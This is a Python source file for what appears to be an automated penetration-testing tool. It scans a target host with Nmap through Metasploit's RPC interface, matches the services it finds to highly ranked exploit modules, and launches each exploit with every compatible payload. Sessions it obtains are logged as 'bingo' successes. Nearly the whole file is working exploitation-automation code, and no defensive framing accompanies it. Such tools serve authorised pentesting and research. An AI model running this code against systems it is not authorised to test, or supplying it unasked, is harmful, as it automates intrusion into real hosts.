import os
import json
import csv
import codecs
import pandas as pd
from util import Utilty
import re
import time
import sys
import copy
import configparser
from bs4 import BeautifulSoup
from msfconsole import Msgrpc
from banner import show_bingo
import socket

# Metasploit's environment.
class Metasploit:
    def __init__(self, target_ip='127.0.0.1'):
        self.util = Utilty()
        self.rhost = target_ip
        # Read config.ini.
        full_path = os.path.dirname(os.path.abspath(__file__))
        config = configparser.ConfigParser()
        try:
            config.read(os.path.join(full_path, 'config.ini'))
        except FileExistsError as err:
            self.util.print_message('fail', 'File exists error: {}'.format(err))
            sys.exit(1)
        # Common setting value.
        st = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        st.connect(('10.255.255.255',1))
        server_host = st.getsockname()[0]
        server_port = int(config['Common']['server_port'])
        self.msgrpc_user = config['Common']['msgrpc_user']
        self.msgrpc_pass = config['Common']['msgrpc_pass']
        self.timeout = int(config['Common']['timeout'])
        self.con_retry = int(config['Common']['con_retry'])
        self.save_path = os.path.join(full_path, config['Common']['save_path'])
        self.data_path = os.path.join(full_path, config['Common']['data_path'])

        if os.path.exists(self.data_path) is False:
            os.mkdir(self.data_path)

        # Metasploit options setting value.
        self.lhost = server_host
        self.lport = int(config['Metasploit']['lport'])
        self.proxy_host = config['Metasploit']['proxy_host']
        self.proxy_port = int(config['Metasploit']['proxy_port'])
        self.prohibited_list = str(config['Metasploit']['prohibited_list']).split('@')
        self.path_collection = str(config['Metasploit']['path_collection']).split('@')

        # Nmap options setting value.
        self.nmap_command = config['Nmap']['command']
        self.nmap_timeout = config['Nmap']['timeout']

        self.client = Msgrpc({'host': server_host, 'port': server_port}, self.msgrpc_user, self.msgrpc_pass, self.timeout, self.con_retry)  # Create Msgrpc instance.
        self.client.login(self.msgrpc_user, self.msgrpc_pass)  # Log in to RPC Server.

    # Create exploit tree.
    def get_exploit_tree(self):
        self.util.print_message('note', 'Get exploit tree.')
        exploit_tree = {}

        if os.path.exists(os.path.join(self.data_path, 'exploit_tree.json')) is False:
            for idx, exploit in enumerate(com_exploit_list):
                console_id = self.client.get_console()
                temp_target_tree = {'targets': []}
                temp_tree = {} 
                # Set exploit module.
                use_cmd = 'use exploit/' + exploit + '\n'
                self.client.call('console.write', [console_id, use_cmd])

                # Get target.
                show_cmd = 'show targets\n'
                target_info = ''
                time_count = 0

                while True:
                    self.client.call('console.write', [console_id,show_cmd])
                    ret = self.client.call('console.read', [console_id])
                    
                    if ret.get(b'data') is None:
                        target_info = bytes(b'no data').decode('utf-8')
                    else:
                        target_info = ret.get(b'data').decode('utf-8')

                    if 'Exploit targets' in target_info:
                        break
                
                    if time_count == 5:
                        self.util.print_message('ok', 'Timeout: {0}'.format(show_cmd))
                        self.util.print_message('ok', 'No exist Targets.')
                        break

                    time.sleep(1.0)
                    time_count += 1

                target_list = self.cutting_strings(r'\s*([0-9]{1,3}) .*[a-z|A-Z|0-9].*[\r\n]', target_info)
                target_list = list(set(target_list))
                target_list.sort()

                for target in target_list:
                    # Get payload list.
                    payload_list = self.client.get_target_compatible_payload_list(exploit, int(target))
                    temp_tree[target] = payload_list

                # Get options.
                options = self.client.get_module_options('exploit', exploit)
                key_list = options.keys()
                option = {}

                for key in key_list:
                    sub_option = {}
                    sub_key_list = options[key].keys()
                    for sub_key in sub_key_list:
                        if isinstance(options[key][sub_key], list):
                            end_option = []
                            for end_key in options[key][sub_key]:
                                end_option.append(end_key.decode('utf-8'))
                            sub_option[sub_key.decode('utf-8')] = end_option
                        else:
                            end_option = {}
                            if isinstance(options[key][sub_key], bytes):
                                sub_option[sub_key.decode('utf-8')] = options[key][sub_key].decode('utf-8')
                            else:
                                sub_option[sub_key.decode('utf-8')] = options[key][sub_key]

                    # User specify.
                    sub_option['user_specify'] = ""
                    option[key.decode('utf-8')] = sub_option

                # Add payloads and targets to exploit tree.
                temp_target_tree['target_list'] = target_list
                temp_target_tree['targets'] = temp_tree
                temp_target_tree['options'] = option
                exploit_tree[exploit] = temp_target_tree

                # Output processing status to console.
                self.util.print_message('ok', '{}/{} exploit:{}, targets:{}'.format(str(idx + 1),
                                                                                  len(com_exploit_list),
                                                                                  exploit,
                                                                                  len(target_list)))
                
                self.client.call('console.destroy', [console_id])

            # Save exploit tree to local file.
            fout = codecs.open(os.path.join(self.data_path, 'exploit_tree.json'), 'w', 'utf-8')
            json.dump(exploit_tree, fout, indent=4)
            fout.close()
            self.util.print_message('ok', 'Saved exploit tree.')
        else:
            # Get exploit tree from local file.
            local_file = os.path.join(self.data_path, 'exploit_tree.json')
            fin = codecs.open(local_file, 'r', 'utf-8')
            exploit_tree = json.loads(fin.read().replace('\0', ''))
            fin.close()
            self.util.print_message('ok', 'Loaded exploit tree from : {}'.format(local_file))
        return exploit_tree

    # Get target host information.
    def get_target_info(self, rhost, proto_list, port_info):
        self.util.print_message('note', 'Get target info.')
        target_tree = {}
        exploit_count = 0
        service_list = []
        opened_service_list = []

        if os.path.exists(os.path.join(self.data_path, 'target_info_' + rhost + '.json')) is False:
            # Create target info.
            target_tree = {
                            'rhost': rhost,
                            'os_type': ostype,
                            'opened_port': len(com_port_list),
                            'opened_port_list': com_port_list,
                            'opened_service': len(opened_service_list),
                            'opened_service_list': opened_service_list,
                            'service_list': service_list,
                            'total_exploit': exploit_count,
                            'session_reverse': 0,
                            'session_list': [],
                            'exploit_sucess': False
                          }

            for port_idx, port_num in enumerate(com_port_list):
                console_id = self.client.get_console()
                temp_tree = {'prod_name':'',
                             'version': '0.0',
                             'protocol': '',
                             'exploit': [],
                             'port': port_num}

                # Get product name.
                service_name = 'unknown'
                service_name = port_info[port_idx]['prod_name'].lower()

                if service_name != 'unknown':
                    temp_tree['prod_name'] = service_name
                    opened_service_list.append(service_name)

                # Get product version.
                temp_tree['version'] = port_info[port_idx]['version']
                # Get protocol type.
                temp_tree['protocol'] = proto_list[port_idx]
                # Get exploit module.
                module_list = []
                raw_module_info = ''
                search_cmd = 'search name:' + service_name + ' type:exploit app:server\n' 
                self.client.call('console.write', [console_id, search_cmd])
                time.sleep(3)
                ret = self.client.call('console.read', [console_id])

                if ret.get(b'data') is None:
                    raw_module_info = bytes(b'no data').decode('utf-8')
                else:
                    raw_module_info = ret.get(b'data').decode('utf-8')

                module_list = self.extract_osmatch_module(self.cutting_strings(r'(exploit/.*\s+\w+)', raw_module_info))
                
                if service_name != 'unknown' and len(module_list) == 0:
                    self.util.print_message('warn', 'Can\'t load exploit module: {}'.format(service_name))
                
                for module in module_list:
                    if module[1] in {'excellent', 'great', 'good'}:
                        temp_tree['exploit'].append(module[0][8:])
                
                if service_name != 'unknown' and len(module_list) != 0:
                    service_list.append(temp_tree)

                # Output processing status to console.
                self.util.print_message('ok', 'Analyzing port {}/{}, {}/{}, '
                                            'Available exploit modules:{}'.format(port_num,
                                                                                  temp_tree['protocol'],
                                                                                  service_name,
                                                                                  port_info[port_idx]['version'],
                                                                                  len(temp_tree['exploit'])))
                exploit_count += len(temp_tree['exploit'])
                self.client.call('console.destroy', [console_id])
            
            target_tree['total_exploit'] = exploit_count
            target_tree['opened_service'] = len(opened_service_list)
            # Save target host information to local file.
            fout = codecs.open(os.path.join(self.data_path, 'target_info_' + rhost + '.json'), 'w', 'utf-8')
            json.dump(target_tree, fout, indent=4)
            fout.close()
            self.util.print_message('ok', 'Saved target tree.')
        else:
            # Get target host information from local file.
            saved_file = os.path.join(self.data_path, 'target_info_' + rhost + '.json')
            fin = codecs.open(saved_file, 'r', 'utf-8')
            target_tree = json.loads(fin.read().replace('\0', ''))
            fin.close()
            self.util.print_message('ok', 'Loaded target tree from : {}'.format(saved_file))

        return target_tree
        
    # Get target OS name.
    def extract_osmatch_module(self, module_list):
        osmatch_module_list = []
        for module in module_list:
            raw_exploit_info = module.split(' ')
            exploit_info = list(filter(lambda s: s != '', raw_exploit_info))
            os_type = exploit_info[0].split('/')[1]
            if ostype == 'windows' and os_type in ['windows', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif ostype == 'unix' and os_type in ['unix', 'freebsd', 'bsdi', 'linux', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif ostype == 'solaris' and os_type in ['solaris', 'unix', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif ostype == 'osx' and os_type in ['osx', 'unix', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif ostype == 'netware' and os_type in ['netware', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif ostype == 'linux' and (os_type in ['linux', 'unix', 'multi']):
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif ostype == 'irix' and os_type in ['irix', 'unix', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif ostype == 'hpux' and os_type in ['hpux', 'unix', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif ostype == 'freebsd' and os_type in ['freebsd', 'unix', 'bsdi', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif ostype == 'firefox' and os_type in ['firefox', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif ostype == 'dialup' and os_type in ['dialup', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif ostype == 'bsdi' and os_type in ['bsdi', 'unix', 'freebsd', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif ostype == 'apple_ios' and os_type in ['apple_ios', 'unix', 'osx', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif ostype == 'android' and os_type in ['android', 'linux', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif ostype == 'aix' and os_type in ['aix', 'unix', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
        return osmatch_module_list

    # Parse.
    def cutting_strings(self, pattern, target):
        return re.findall(pattern, target)

    # Get port list from Nmap.
    def get_port_list(self, rhost, command, timeout, nmap_result_file):
        self.client.get_console()
        self.util.print_message('note', 'Execute Nmap against {}'.format(rhost))
        global com_port_list
        global ostype
        port_list = []
        proto_list = []
        info_list = []

        if os.path.exists(os.path.join(self.data_path, 'target_info_' + rhost + '.json')) is False:
            
            # Execute Nmap.
            self.util.print_message('ok', 'Start time: {}'.format(self.util.get_current_date()))
            msfcmd = self.client.call('console.write', [self.client.console_id, command])

            time_count = 0
            while True:
                # Judgement of Nmap finishing.
                ret = self.client.call('console.read', [self.client.console_id])
                try:
                    if (time_count % 5) == 0:
                        self.util.print_message('ok', 'Port scanning: {} [Elapsed time: {} s]'.format(rhost, time_count))
                  
                    if timeout == time_count:
                        self.client.termination(self.client.console_id)
                        self.util.print_message('ok', 'Timeout   : {}'.format(command))
                        self.util.print_message('ok', 'End time  : {}'.format(self.util.get_current_date()))
                        break

                    status = ret.get(b'busy')
                    if status is False:
                        self.util.print_message('ok', 'End time  : {}'.format(self.util.get_current_date()))
               
                        break
                except Exception as e:
                    self.util.print_exception(e, 'Failed: {}'.format(command))
                time.sleep(1.0)
                time_count += 1

            nmap_result = ''
            cat_cmd = 'cat ' + nmap_result_file + '\n'
            msfcmd = self.client.call('console.write', [self.client.console_id, cat_cmd])
            time.sleep(3.0)

            port_list = []
            proto_list = []
            info_list = []

            nmap_result = open(nmap_result_file, 'rb').read()
            bs = BeautifulSoup(nmap_result, 'lxml')
            ports = bs.find_all('port')
            for idx, port in enumerate(ports):
                port_list.append(str(port.attrs['portid']))
                proto_list.append(port.attrs['protocol'])

                for obj_child in port.contents:
                    service = {}
                    if obj_child.name == 'service':
                        if 'product' in obj_child.attrs:
                            if 'telnet' in obj_child.attrs['product']:
                                service.update({'prod_name': 'telnet'})
                            elif 'Apache' in obj_child.attrs['product']:
                                service.update({'prod_name': 'apache'})
                            elif 'Samba' in obj_child.attrs['product']:
                                service.update({'prod_name': 'samba'})
                            elif 'PostgreSQL' in obj_child.attrs['product']:
                                service.update({'prod_name': 'postgresql'})
                            elif 'OpenSSH' in obj_child.attrs['product']:
                                service.update({'prod_name': 'ssh'})
                            elif 'Microsoft' in obj_child.attrs['product']:
                                service.update({'prod_name': obj_child.attrs['product'][10:]})
                            elif 'IRC' in obj_child.attrs['product']:
                                service.update({'prod_name': 'irc'})
                            elif 'distccd' in obj_child.attrs['product']:
                                service.update({'prod_name': 'distcc'})
                            elif 'GNU' in obj_child.attrs['product']:
                                service.update({'prod_name': 'java-rmi'})
                            else:
                                service.update({'prod_name': obj_child.attrs['product']})
                        else:
                            service.update({'prod_name': 'unknown'})
                        
                        if 'version' in obj_child.attrs:
                            service.update({'version': obj_child.attrs['version']})
                        else:
                            service.update({'version': 'unknown'})

                        if 'extrainfo' in obj_child.attrs:
                            service.update({'extrainfo': obj_child.attrs['extrainfo']})
                        else:
                            service.update({'extrainfo': 'unknown'})

                        info_list.append(service)
                
                        # Display getting port information.
                        self.util.print_message('ok', 'Getting {}/{} info: {}'.format(str(port.attrs['portid']),
                                                                            port.attrs['protocol'],
                                                                            info_list[idx]['prod_name']))

            ser_file = os.path.join(self.data_path, 'services.csv')
            ser = pd.read_csv(ser_file)
            for col in ser.columns:
                sername = ser[col].tolist()
            for ser_nam in info_list:
                if ser_nam['prod_name'] == 'unknown':
                    break
                elif ser_nam['prod_name'] not in sername:
                    fout = codecs.open(ser_file, 'a', 'utf-8')
                    fout.write(ser_nam['prod_name'].lower() + '\n')
                    fout.close()

            some_os = bs.find('osmatch')
            os_name = 'unknown'
            for obj_child in some_os.contents:
                if obj_child.name == 'osclass' and 'osfamily' in obj_child.attrs:
                    os_name = (obj_child.attrs['osfamily']).lower()
                    break
            ostype = os_name

            os_file = os.path.join(self.data_path, 'ostype.csv')
            ot = pd.read_csv(os_file)
            for col in ot.columns:
                otl = ot[col].tolist()
            if ostype not in  otl:
                    fout = codecs.open(os_file, 'a', 'utf-8')
                    fout.write(ostype + '\n')
                    fout.close()

            if len(port_list) == 0:
                self.util.print_message('warn', 'No open port.')
                self.util.print_message('warn', 'Shutdown Exploit Expert...')
                self.client.termination(self.client.console_id)
                exit(1)
                
            # Update com_port_list.
            only_num = []
            for port in port_list:
                if port.isnumeric():
                    only_num.append(port)
            com_port_list = only_num

        else:
            # Get target host information from local file.
            saved_file = os.path.join(self.data_path, 'target_info_' + rhost + '.json')
            fin = codecs.open(saved_file, 'r', 'utf-8')
            target_tree = json.loads(fin.read().replace('\0', ''))
            fin.close()
            self.util.print_message('ok', 'Loaded target tree from : {}'.format(saved_file))
            key_list = list(target_tree.keys())
            for key in key_list[2:]:
                port_list.append(str(key))

            # Update com_port_list.
            only_num = []
            for port in port_list:
                if port.isnumeric():
                    only_num.append(port)
            com_port_list = only_num

        self.client.call('console.destroy', [self.client.console_id])
        return port_list, proto_list, info_list

    # Get Exploit module list.
    def get_exploit_list(self):
        global com_exploit_list
        self.util.print_message('note', 'Get exploit list.')
        all_exploit_list = []

        # Get Exploit module list.
        exploit_candidate_list = self.client.get_module_list('exploit')
        fin = codecs.open(os.path.join(self.data_path, 'expupdate.json'), 'r', 'utf-8')
        chk_update = json.loads(fin.read().replace('\0', ''))
        fin.close()

        if chk_update['exploitlist'] == len(exploit_candidate_list) and os.path.exists(os.path.join(self.data_path, 'exploit_list.csv')) is True:
            self.util.print_message('ok', 'exploit list up to date.')
            # Get exploit module list from local file.
            local_file = os.path.join(self.data_path, 'exploit_list.csv')
            fin = codecs.open(local_file, 'r', 'utf-8')
            for item in fin:
                all_exploit_list.append(item.rstrip('\n'))
            fin.close()
            com_exploit_list = all_exploit_list
            self.util.print_message('ok', 'Loaded exploit list from : {}'.format(local_file))

        elif os.path.exists(os.path.join(self.data_path, 'exploit_list.csv')) is False or chk_update['exploitlist'] != len(exploit_candidate_list):
            self.util.print_message('ok', 'Loading exploit list from Metasploit.')

            for idx, exploit in enumerate(exploit_candidate_list):
                module_info = self.client.get_module_info('exploit', exploit)
                time.sleep(0.1)
                try:
                    rank = module_info[b'rank'].decode('utf-8')
                    if rank in {'excellent', 'great', 'good'}:
                        all_exploit_list.append(exploit)
                        self.util.print_message('ok', '{}/{} Loaded exploit: {}'.format(str(idx + 1),
                                                                                      len(exploit_candidate_list),
                                                                                      exploit))
                    else:
                        self.util.print_message('warn', '{}/{} {} module is danger (rank: {}). Can\'t load.'
                                                .format(str(idx + 1), len(exploit_candidate_list), exploit, rank))
                except Exception as e:
                    self.util.print_exception(e, 'Failed: module.info')
                    exit(1)

            # Save Exploit module list to local file.
            self.util.print_message('ok', 'Total loaded exploit module: {}'.format(str(len(all_exploit_list))))
            fout = codecs.open(os.path.join(self.data_path, 'exploit_list.csv'), 'w', 'utf-8')
            for item in all_exploit_list:
                fout.write(item + '\n')
            fout.close() 

            exploit_ttlist = {'exploitlist':len(exploit_candidate_list)}         
            fout = codecs.open(os.path.join(self.data_path, 'expupdate.json'), 'w', 'utf-8')
            json.dump(exploit_ttlist, fout, indent=4)
            fout.close()

            com_exploit_list = all_exploit_list
            self.util.print_message('ok', 'Saved exploit list.')
        else:
            # Get exploit module list from local file.
            local_file = os.path.join(self.data_path, 'exploit_list.csv')
            fin = codecs.open(local_file, 'r', 'utf-8')
            for item in fin:
                all_exploit_list.append(item.rstrip('\n'))
            fin.close()
            
            com_exploit_list = all_exploit_list
            self.util.print_message('ok', 'Loaded exploit list from : {}'.format(local_file))
        return all_exploit_list

    # Get payload list.
    def get_payload_list(self, module_name='', target_num=''):
        global com_payload_list
        self.util.print_message('note', 'Get payload list.')
        payload_list = []

        # Get all Payloads.
        payload_list = self.client.get_module_list('payload')
        fin = codecs.open(os.path.join(self.data_path, 'payupdate.json'), 'r', 'utf-8')
        chk_update = json.loads(fin.read().replace('\0', ''))
        fin.close()

        if chk_update['payloadlist'] == len(payload_list) and os.path.exists(os.path.join(self.data_path, 'payload_list.csv')) is True:
            self.util.print_message('ok', 'payload list up to date.')
            # Get payload list from local file.
            local_file = os.path.join(self.data_path, 'payload_list.csv')
            payload_list = []
            fin = codecs.open(local_file, 'r', 'utf-8')
            for item in fin:
                payload_list.append(item.rstrip('\n'))
            fin.close()
            self.util.print_message('ok', 'Loaded payload list from : {}'.format(local_file))
            com_payload_list = payload_list

        elif os.path.exists(os.path.join(self.data_path, 'payload_list.csv')) is False or chk_update['payloadlist'] != len(payload_list):
            self.util.print_message('ok', 'Loading payload list from Metasploit.')
            # Save payload list to local file.
            fout = codecs.open(os.path.join(self.data_path, 'payload_list.csv'), 'w', 'utf-8')
            for idx, item in enumerate(payload_list):
                time.sleep(0.1)
                self.util.print_message('ok', '{}/{} Loaded payload: {}'.format(str(idx + 1),
                                                                              len(payload_list),
                                                                              item))
                fout.write(item + '\n')
            fout.close()

            payload_ttlist = {'payloadlist':len(payload_list)}         
            fout = codecs.open(os.path.join(self.data_path, 'payupdate.json'), 'w', 'utf-8')
            json.dump(payload_ttlist, fout, indent=4)
            fout.close()

            self.util.print_message('ok', 'Saved payload list.')
            com_payload_list = payload_list
        else:
            # Get payload list from local file.
            local_file = os.path.join(self.data_path, 'payload_list.csv')
            payload_list = []
            fin = codecs.open(local_file, 'r', 'utf-8')
            for item in fin:
                payload_list.append(item.rstrip('\n'))
            fin.close()
            self.util.print_message('ok', 'Loaded payload list from : {}'.format(local_file))
            com_payload_list = payload_list
        return payload_list

    # Get available payload list (convert from string to number).
    def get_available_actions(self, payload_list, ostype):
        payload_num_list = []
        for self_payload in payload_list:
            for (idx, payload) in enumerate(com_payload_list):
                if payload == self_payload:
                    if ostype == 'windows':
                        tylist = ['windows', 'multi']
                        for ty in tylist:
                            if ty in self_payload:
                                payload_num_list.append(idx)
                    elif ostype == 'unix':
                        tylist = ['unix', 'freebsd', 'bsdi', 'linux', 'multi']
                        for ty in tylist:
                            if ty in self_payload:
                                payload_num_list.append(idx)
                    elif ostype == 'solaris':
                        tylist = ['solaris', 'unix', 'multi']
                        for ty in tylist:
                            if ty in self_payload:
                                payload_num_list.append(idx)
                    elif ostype == 'osx':
                        tylist = ['osx', 'unix', 'multi']
                        for ty in tylist:
                            if ty in self_payload:
                                payload_num_list.append(idx)
                    elif ostype == 'netware':
                        tylist = ['netware', 'multi']
                        for ty in tylist:
                            if ty in self_payload:
                                payload_num_list.append(idx)
                    elif ostype == 'linux':
                        tylist = ['linux', 'unix', 'multi']
                        for ty in tylist:
                            if ty in self_payload:
                                payload_num_list.append(idx)
                    elif ostype == 'irix':
                        tylist = ['irix', 'unix', 'multi']
                        for ty in tylist:
                            if ty in self_payload:
                                payload_num_list.append(idx)
                    elif ostype == 'hpux':
                        tylist = ['hpux', 'unix', 'multi']
                        for ty in tylist:
                            if ty in self_payload:
                                payload_num_list.append(idx)
                    elif ostype == 'freebsd':
                        tylist = ['freebsd', 'unix', 'bsdi', 'multi']
                        for ty in tylist:
                            if ty in self_payload:
                                payload_num_list.append(idx)
                    elif ostype == 'firefox':
                        tylist = ['firefox', 'multi']
                        for ty in tylist:
                            if ty in self_payload:
                                payload_num_list.append(idx)
                    elif ostype == 'dialup':
                        tylist = ['dialup', 'multi']
                        for ty in tylist:
                            if ty in self_payload:
                                payload_num_list.append(idx)
                    elif ostype == 'bsdi':
                        tylist = ['bsdi', 'unix', 'freebsd', 'multi']
                        for ty in tylist:
                            if ty in self_payload:
                                payload_num_list.append(idx)
                    elif ostype == 'apple_ios':
                        tylist = ['apple_ios', 'unix', 'osx', 'multi']
                        for ty in tylist:
                            if ty in self_payload:
                                payload_num_list.append(idx)
                    elif ostype == 'android':
                        tylist = ['android', 'linux', 'multi']
                        for ty in tylist:
                            if ty in self_payload:
                                payload_num_list.append(idx)
                    elif ostype == 'aix':
                        tylist = ['aix', 'unix', 'multi']
                        for ty in tylist:
                            if ty in self_payload:
                                payload_num_list.append(idx)
                    break
        return payload_num_list

    # Execute exploit.
    def execute_exploit(self, action, target, target_info, idx, exploit_tree, ttcount, ttidx):
        global uuid
        global job_id
        # Set payload.
        selected_payload = ''
        if action != 'no payload':
            selected_payload = com_payload_list[action]
        else:
            # No payload
            selected_payload = ''
        
        # Execute exploit.
        message = ''
        session_list = []
        session_info = {}
        sesscsv = {} 
        sess_list =[]
        done = False
        uuid = ''
        job_id = 0
        
        job_id, uuid = self.client.execute_module('exploit', target_info['exploit'], target, selected_payload, self.rhost, target_info['port'])   
        
        if uuid is not None:
            msfcmd = self.check_running_module(job_id, uuid)
            sessions = self.client.get_session_list()
            key_list = sessions.keys()
            keyvalue = list(key_list)
            if len(key_list) != 0:
                # Probably successfully of exploitation (but unsettled).
                for key in key_list:
                    # Successfully of exploitation.
                    session_id = int(key)
                    session_type = sessions[key][b'type'].decode('utf-8')
                    session_port = str(sessions[key][b'session_port'])
                    session_service = target_info['prod_name']
                    session_exploit = sessions[key][b'via_exploit'].decode('utf-8')
                    session_payload = sessions[key][b'via_payload'].decode('utf-8')
                    module_info = self.client.get_module_info('exploit', session_exploit)
                    status = True
                    if status:
                        # Successful of post-exploitation.
                        done = True
                        message = 'bingo!! '
                        show_bingo()

                        session_info.update({'type':session_type})
                        session_info.update({'port':session_port})
                        session_info.update({'prod_name':session_service})
                        session_info.update({'exploit':session_exploit[8:]})
                        session_info.update({'target':target})
                        session_info.update({'payload':session_payload[8:]})
                        session_list.append(session_info)

                        saved_file = os.path.join(self.data_path, 'target_info_' + self.rhost + '.json')
                        fin = codecs.open(saved_file, 'r', 'utf-8')
                        target_tree = json.loads(fin.read().replace('\0', ''))
                        fin.close()
                        target_tree['session_list'].append(session_info)
                        fout = codecs.open(saved_file, 'w', 'utf-8')
                        json.dump(target_tree, fout, indent=4)
                        fout.close()  
                        
                        sesscsv.update({'prod_name':session_service})
                        sesscsv.update({'exploit':session_exploit[8:]})
                        sesscsv.update({'target':target})
                        sesscsv.update({'payload':session_payload[8:]})

                        fin = codecs.open(os.path.join(self.data_path, 'sesslist.txt'), 'r', 'utf-8')
                        for sess in fin:
                            sess = sess.replace("'", '"')
                            sesslist = json.loads(sess)
                            sess_list.append(sesslist)
                        fin.close()
                        fout = codecs.open(os.path.join(self.data_path, 'sesslist.txt'), 'a', 'utf-8')
                        if sesscsv not in sess_list:
                            fout.write(str(sesscsv) + '\n')
                        fout.close()

                    else:
                        # Failure of post-exploitation.
                        message = 'misfire '

                    self.client.stop_session(session_id)
                    break
            else:
                # Failure exploitation.
                message = 'failure '
        else:
            # Time out or internal error of Metasploit.
            done = True
            message = 'time out'

        # Output result to console. 
        self.util.print_message('ok', '{0}/{1} {2} {3} ({4}/{5}) '
                                    '{6} | {7} | {8} '.format(  ttidx,
                                                                ttcount,
                                                                message,
                                                                self.rhost,
                                                                target_info['protocol'],
                                                                target_info['port'],
                                                                target_info['prod_name'],
                                                                target_info['exploit'],
                                                                selected_payload))
        if len(keyvalue) != 0:
            self.client.stop_session(keyvalue[0])

        return done, session_list

    # Check status of running module.
    def check_running_module(self, job_id, uuid):
        # Waiting job to finish.
        time_count = 0
        while True:
            job_id_list = self.client.get_job_list()
            if job_id in job_id_list:
                time.sleep(1)
            else:
                return True
            if self.timeout == time_count:
                self.client.stop_job(str(job_id))
                self.util.print_message('warn', 'Timeout: job_id={}, uuid={}'.format(job_id, uuid))
                return False
            time_count += 1

    def run(self, exploit_tree, target_tree, serviceidx, ttcount):
        # Execute exploitation.
        self.util.print_message('note', 'Execute exploitation service: {}.'.format(target_tree['service_list'][serviceidx]['prod_name']))
        execute_list = []
        target_info = {}
        sess_info = []
        done = False
        ttidx = 1
    
        ostype = target_tree['os_type']
        module_list = target_tree['service_list'][serviceidx]['exploit']
        for exploit in module_list:
            target_list = exploit_tree[exploit]['target_list']
            service_name = target_tree['service_list'][serviceidx]['prod_name']
            for target in target_list:
                payload_list = exploit_tree[exploit]['targets'][target]
                if service_name != 'unknown':
                    available_actions = self.get_available_actions(payload_list, ostype)
                target_info = {'protocol': target_tree['service_list'][serviceidx]['protocol'],
                                'prod_name': service_name,
                                'version': target_tree['service_list'][serviceidx]['version'],
                                'exploit': exploit, 
                                'target': target, 
                                'port': target_tree['service_list'][serviceidx]['port']}
                for idx, action in enumerate(available_actions):
                    # Execute exploit.
                    done, sess_info = self.execute_exploit(action,
                                                               target,
                                                               target_info,
                                                               idx,
                                                               exploit_tree,
                                                               ttcount,
                                                               ttidx)
                    ttidx += 1
                    finish_time = (ttcount-ttidx)*5
                    h = int(finish_time / 3600)
                    m = int(finish_time / 60) % 60
                    s = finish_time % 60 
                    print('finish in arround {0}h{1}m{2}s'.format(h,m,s))
                    if done is True:
                        break

        # Execute post exploitation.
        for session in sess_info:
            self.util.print_message('note', 'Execute post exploitation.')
            self.util.print_message('ok', 'Target session info.\n'
                                        '    session product : {0}\n'
                                        '    session type : {1}\n'
                                        '    target port  : {2}\n'
                                        '    exploit      : {3}\n'
                                        '    target       : {4}\n'
                                        '    payload      : {5}'.format(session['prod_name'],
                                                                        session['type'],
                                                                        session['port'],
                                                                        session['exploit'],
                                                                        session['target'],
                                                                        session['payload']))
        return sess_info

    def moderun(self, exploit, target, payload, service): 
        job_id, uuid = self.client.execute_module('exploit', exploit, target, payload, self.rhost, service['port'])
        if uuid is not None:
            msfcmd = self.check_running_module(job_id, uuid)
            sessions = self.client.get_session_list()
            key_list = sessions.keys()
            keyvalue = list(key_list)
            
            if len(key_list) != 0:
                show_bingo()
                message = 'bingo!! for machine learing '
                self.util.print_message('ok', '{0} {1} ({2}/{3}) '
                '{4} | {5} | {6} '.format(message,
                                            self.rhost,
                                            service['protocol'],
                                            service['port'],
                                            service['prod_name'],
                                            exploit,
                                            payload))
                self.util.print_message('ok', 'exploit sucess')

                self.client.stop_session(keyvalue[0])
            else:
                self.util.print_message('ok', 'no exploit')